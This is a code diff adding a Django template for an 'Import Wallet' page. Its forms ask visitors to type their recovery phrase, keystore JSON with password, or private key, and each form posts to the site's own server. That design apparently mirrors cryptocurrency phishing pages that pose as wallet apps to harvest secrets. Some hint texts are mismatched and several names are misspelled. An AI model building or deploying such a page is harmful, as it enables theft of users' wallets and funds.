@@ -1,0 +1,74 @@
+{% extends 'base.html' %}
+{% load static %}
+{% block content %}
+
+<style>
+    body{
+        background-color:black;
+    }
+
+    .input_div{
+        color:black;
+        width:100%;
+        height:50px;
+    }
+
+    .input_div input{
+        width:100%;
+        height:100%;
+        display: block;
+        padding:10px;
+        background-color:white;
+        border-radius:5px;
+        border:none;
+        outline:none;
+    }
+</style>
+    
+
+    <div class='tab_Container'>
+        <a href='{% url "wallet" %}'><i class='fa fa-chevron-left'></i>Import Wallet</a>
+        <div class = "tabinator">
+            <input type = "radio" id = "tab1" name = "tabs" checked>
+            <label for = "tab1">Phrase</label>
+            <input type = "radio" id = "tab2" name = "tabs">
+            <label for = "tab2">Keystore JSON</label>
+            <input type = "radio" id = "tab3" name = "tabs">
+            <label for = "tab3">Private Key</label>
+            <div id = "content1">
+                <form method='POST' >
+                    {% csrf_token %}
+                   <div class='form-group'>
+                       <textarea class='form-control' rows='5' style='margin-top:40px;' placeholder="Phrase" name='phrase'></textarea>
+                   </div>
+                   <p class='text'>Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+                   <button type='submit' class='btn btn-primary' name='phrase_btn' style='width:100%; text-transform:uppercase; margin-top:20px;'>Import</button>
+                </form>
+            </div>
+            <div id = "content2">
+                <form method='POST' >
+                    {% csrf_token %}
+                    <div class='form-group'>
+                        <textarea class='form-control' rows='5' style='margin-top:40px;' placeholder="Keystone JSON" name='keystone'></textarea>
+                    </div>
+                   <div class='input_div'>
+                        <input type='password' placeholder="Password" name='pass'>
+                    </div>
+                    <p class='text'>Several lines of text beginning with "{...}" plus the password you used to encrypt it..</p>
+                    <button type='submit' class='btn btn-primary' name='keystone_btn' style='width:100%; text-transform:uppercase; margin-top:20px;'>Import</button>
+                 </form>
+            </div>
+            <div id = "content3">
+                <form method='POST' >
+                    {% csrf_token %}
+                   <div class='input_div' style='margin-top:20px;'>
+                        <input type='text' placeholder="Private Key" name='private_key'>
+                    </div>
+                    <p class='text'>Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+                    <button type='submit' class='btn btn-primary'  name='prviatekey_btn' style='width:100%; text-transform:uppercase; margin-top:20px;'>Import</button>
+                 </form>
+            </div>
+          </div>
+    </div>
+
+  {% endblock content %}
